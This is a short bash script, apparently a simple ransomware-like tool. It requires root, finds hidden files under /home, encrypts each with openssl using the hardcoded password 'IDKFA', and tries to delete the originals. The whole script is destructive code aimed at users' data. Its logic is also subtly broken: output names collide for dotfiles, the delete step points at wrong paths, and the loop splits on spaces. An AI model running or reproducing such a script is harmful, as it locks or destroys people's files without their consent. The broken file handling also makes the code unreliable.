#!/bin/bash
if [[ $(id -u) -ne 0 ]] ; then echo "Please run as root" ; exit 1 ; fi

cd /home;

for f in $(find /home -name '.*'); do
	if [ -f $f ]; then
		sudo openssl enc -aes-256-cbc -salt -in "$f" -out "${f%.*}".enc -k "IDKFA";
		echo -e "File: [$f] encrypted";
		sudo rm -f ./"$f";
	fi
done
